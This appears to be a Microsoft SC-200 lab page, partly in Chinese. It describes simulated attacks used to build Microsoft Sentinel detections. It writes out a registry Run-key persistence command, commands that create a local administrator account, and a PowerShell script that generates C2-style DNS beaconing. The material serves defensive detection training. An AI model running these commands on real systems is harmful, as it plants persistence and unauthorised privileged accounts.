---
lab:
  title: 练习 5 - 了解检测建模
  module: Module 7 - Create detections and perform investigations using Microsoft Sentinel
---

# <a name="module-7---lab-1---exercise-5---understand-detection-modeling"></a>模块 7 - 实验室 1 - 练习 5 - 了解检测建模

![实验室概述。](../Media/SC-200-Lab_Diagrams_Mod7_L1_Ex4.png)
### <a name="task-1-understand-the-attacks"></a>任务 1：了解攻击

><bpt id="p1">**</bpt>Important: You will perform no actions in this exercise.<ept id="p1">**</ept>  These instructions are only an explanation of the attacks you will perform in the next exercise. Please carefully read this page.

攻击模式基于开源项目： https://github.com/redcanaryco/atomic-red-team


#### <a name="attack-1---persistence-with-registry-key-add"></a>攻击 1 - 通过注册表项添加实现的持久性攻击

Attackers will add a program in the Run Registry key. This achieves persistence by making the program run every time the user logs on.

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

#### <a name="attack-2---user-add-and-elevate-privilege"></a>攻击 2 - 用户添加和特权提升

Attackers will add new users and elevate the new user to the Administrators group. This enables the attacker to logon with a different account that is privileged.

```
net user theusernametoadd /add
net user theusernametoadd ThePassword1!
net localgroup administrators theusernametoadd /add
```

#### <a name="attack-3---dns--c2"></a>攻击 3 - DNS / C2 

Attacker will send a large volume of DNS queries to a command and control (C2) server. The intent is to trigger threshold-based detection on the number of DNS queries either from a single source system or to a single target domain.

```
param(
    [string]$Domain = "microsoft.com",
    [string]$Subdomain = "subdomain",
    [string]$Sub2domain = "sub2domain",
    [string]$Sub3domain = "sub3domain",
    [string]$QueryType = "TXT",
        [int]$C2Interval = 8,
        [int]$C2Jitter = 20,
        [int]$RunTime = 240
)
$RunStart = Get-Date
$RunEnd = $RunStart.addminutes($RunTime)
$x2 = 1
$x3 = 1 
Do {
    $TimeNow = Get-Date
    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
    if ($x2 -eq 3 )
    {
        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x2 = 1
    }
    else
    {
        $x2 = $x2 + 1
    }
    if ($x3 -eq 7 )
    {
        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x3 = 1
    }
    else
    {
        $x3 = $x3 + 1
    }
    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
    Start-Sleep -Seconds $Jitter
}
Until ($TimeNow -ge $RunEnd)
```


### <a name="task-2-understand-detection-modeling"></a>任务 2：了解检测建模

本实验室中使用的攻击检测配置循环代表所有数据源，虽然你仅专注于两个特定数据源。

To build a detection, you first start with building a KQL statement. Since you will attack a host, you will have representative data to start building the KQL statement.


有 KQL 语句后，即可创建分析规则。

触发规则并创建警报和事件后，调查以确定你是否提供了可帮助安全运营分析师进行调查的字段。

接下来，你将对分析规则进行其他更改。

>**注意：** 为了方便演示实验室，某些警报触发的时间期限较短。

## <a name="proceed-to-exercise-6"></a>继续完成练习 6
